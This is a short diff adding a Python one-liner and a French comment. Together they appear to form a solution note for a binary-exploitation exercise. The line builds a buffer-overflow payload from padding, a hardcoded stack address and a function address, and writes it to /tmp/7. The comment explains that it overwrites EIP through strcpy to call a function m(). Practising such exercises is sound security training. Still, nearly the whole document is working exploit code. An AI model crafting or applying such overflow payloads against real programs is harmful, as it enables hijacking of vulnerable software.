@@ -1,0 +1,4 @@
+python -c "print 'abcd' + 'a'*16 + '\x3c\xf6\xff\xbf ' + '\xf4\x84\x04\x08\x00' + ' ' + 'c'*100" > /tmp/7
+^ on call m() en overwritant eip de strcpy
+
+
